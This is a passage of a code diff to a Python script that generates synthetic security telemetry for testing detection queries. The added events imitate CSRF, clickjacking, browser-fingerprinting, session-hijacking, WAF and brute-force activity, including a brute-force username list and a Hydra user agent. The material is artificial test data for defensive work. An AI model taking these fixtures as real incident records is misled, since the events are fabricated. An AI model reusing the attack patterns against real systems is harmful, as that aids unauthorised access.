+            "content_type": "text/html",
+            "headers": "Content-Type: text/html",
+            "service": "octo-drone-shop",
+        },
+    ]
+    for idx, spec in enumerate(attack_specs):
+        shared_trace = f"trace_attack_{idx:02d}"
+        events.append(application_event(
+            spec["service"],
+            message="Request completed",
+            url=spec["url"],
+            http_method="GET",
+            status_code="200",
+            response_time_ms=640 + idx * 55,
+            client_ip=browser_ip,
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
+            trace_id=shared_trace,
+            session_id=f"sess_attack_{idx:02d}",
+            span_attributes=spec["span_attributes"],
+            attack_type=spec["attack_type"],
+            attack_severity=spec["severity"],
+            content_type=spec.get("content_type", "application/json"),
+            response_headers=spec.get("headers", "Content-Type: application/json; X-Frame-Options: DENY"),
+            referrer="https://portal.example.com/app",
+            offset=40 + idx,
+        ))
+
+    # CSRF violations and clickjacking exposure
+    events.extend([
+        application_event("enterprise-crm-portal", message="Request completed",
+                          url="/crm/api/profile/email", http_method="POST",
+                          client_ip=browser_ip, user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+                          referrer=None, content_type="application/json",
+                          response_headers="Content-Type: application/json", offset=50),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/api/account/address", http_method="PUT",
+                          client_ip=browser_ip, referrer=None,
+                          response_headers="Content-Type: application/json", offset=51),
+        application_event("enterprise-crm-portal", message="Request completed",
+                          url="/crm/dashboard/embedded", http_method="GET",
+                          client_ip=browser_ip, content_type="text/html",
+                          response_headers="Content-Type: text/html", offset=52),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/catalog/embedded", http_method="GET",
+                          client_ip=browser_ip, content_type="text/html",
+                          response_headers="Content-Type: text/html", offset=53),
+    ])
+
+    # Browser fingerprinting
+    events.extend([
+        application_event("enterprise-crm-portal", message="Request completed",
+                          url="/crm/login", client_ip=browser_ip,
+                          span_attributes="canvas.toDataURL toBlob getImageData webgl.getParameter WEBGL_debug_renderer_info getExtension",
+                          offset=54),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/login", client_ip=browser_ip,
+                          span_attributes="AudioContext OfflineAudioContext createOscillator navigator.plugins navigator.languages navigator.hardwareConcurrency",
+                          offset=55),
+    ])
+
+    # Session hijacking: >5 distinct session IDs from same source and user agent
+    for idx in range(6):
+        events.append(application_event(
+            "enterprise-crm-portal",
+            message="Request completed",
+            url="/crm/account",
+            client_ip=hijack_ip,
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
+            session_id=f"sess_hijack_{idx:02d}",
+            span_name="HTTP GET /crm/account",
+            span_attributes="cookie.session rotate-session-id",
+            attack_type="session_hijacking",
+            attack_severity="high",
+            offset=60 + idx,
+        ))
+
+    # WAF correlation style signals captured in application telemetry
+    for idx, score in enumerate(["72", "88", "91"]):
+        events.append(application_event(
+            "octo-drone-shop",
+            message="Request completed",
+            url=f"/shop/admin/export?attempt={idx}",
+            client_ip="91.92.109.18",
+            attack_type="security_misconfig",
+            attack_severity="medium",
+            waf_score=score,
+            span_attributes="waf header captured x-oci-waf-score",
+            offset=70 + idx,
+        ))
+
+    # Authentication brute force
+    brute_force_users = ["admin", "billing", "support", "orders", "sales", "finance", "ceo"]
+    for idx, username in enumerate(brute_force_users):
+        events.append(application_event(
+            "enterprise-crm-portal",
+            message=f"login failed for {username}",
+            level="WARN",
+            url="/crm/login",
+            http_method="POST",
+            status_code="401",
+            client_ip=brute_force_ip,
+            user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+            user=username,
+            attack_type="broken_auth",
+            attack_severity="high",
+            span_attributes="authentication failure retry",
+            referrer=None,
+            offset=80 + idx,
+        ))
+    events.append(application_event(
+        "enterprise-crm-portal",
+        message="auth failure: rate limit bypass attempt",
+        level="WARN",
+        url="/crm/login",
+        http_method="POST",
+        status_code="429",
+        client_ip=brute_force_ip,
+        user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+        user="admin",
+        attack_type="rate_limit_bypass",
+        attack_severity="high",
+        referrer=None,
+        offset=88,
+    ))
+
+    return events
+
+
 def main():
     parser = argparse.ArgumentParser(description="Generate test detection logs")
+    parser.add_argument("--days", type=int, default=1,
+                        help="Replicate the generated detection datasets across N daily windows")
     parser.add_argument("--validate", action="store_true",
                         help="Validate that all query files have matching test events")
     args = parser.parse_args()
@@ -3493,42 +4229,39 @@ def main():
     waf_events = generate_waf_events()
     lb_events = generate_lb_access_events()
     webapp_events = generate_webapp_events()
+    application_events = generate_application_events()
+
+    generated_sets = {
+        "oci_audit.jsonl": oci_events,
+        "cloud_guard.jsonl": cg_events,
+        "linux_syslog.jsonl": linux_events,
+        "windows_sysmon.jsonl": windows_events,
+        "windows_event_security.jsonl": winsec_events,
+        "windows_event_system.jsonl": winsys_events,
+        "linux_secure.jsonl": linsec_events,
+        "sysmon_operational.jsonl": sysmon_events,
+        "sysmon_network.jsonl": sysmon_net_events,
+        "waf_security.jsonl": waf_events,
+        "lb_access.jsonl": lb_events,
+        "webapp_security.jsonl": webapp_events,
+        "application_logs.jsonl": application_events,
+    }
 
     # Write NDJSON files
     results = {}
-    files = [
-        ("oci_audit.jsonl", oci_events),
-        ("cloud_guard.jsonl", cg_events),
-        ("linux_syslog.jsonl", linux_events),
-        ("windows_sysmon.jsonl", windows_events),
-        ("windows_event_security.jsonl", winsec_events),
-        ("windows_event_system.jsonl", winsys_events),
-        ("linux_secure.jsonl", linsec_events),
-        ("sysmon_operational.jsonl", sysmon_events),
-        ("sysmon_network.jsonl", sysmon_net_events),
-        ("waf_security.jsonl", waf_events),
-        ("lb_access.jsonl", lb_events),
-        ("webapp_security.jsonl", webapp_events),
-    ]
-
-    for filename, events in files:
+    for filename, events in generated_sets.items():
+        expanded_events = expand_events_over_days(events, args.days)
         filepath = OUTPUT_DIR / filename
-        count = write_jsonl(filepath, events)
+        count = write_jsonl(filepath, expanded_events)
         results[filename] = count
         print(f"  {count:>5} events -> {filepath}")
 
-    # Write manifest
-    manifest = {
-        "generated_at": datetime.now(timezone.utc).isoformat(),
-        "files": {name: {"event_count": count} for name, count in results.items()},
-        "total_events": sum(results.values()),
-    }
+    manifest = rebuild_manifest(OUTPUT_DIR)
     manifest_path = OUTPUT_DIR / "manifest.json"
-    with open(manifest_path, 'w') as f:
-        json.dump(manifest, f, indent=2)
 
-    print(f"\n  Total: {sum(results.values())} events across {len(results)} files")
+    print(f"\n  Total: {manifest['total_events']} events across {len(manifest['files'])} files")
     print(f"  Manifest: {manifest_path}")
+    print(f"  Detection window: {args.days} day(s)")
 
     if args.validate:
         print("\n  Validating query coverage...")
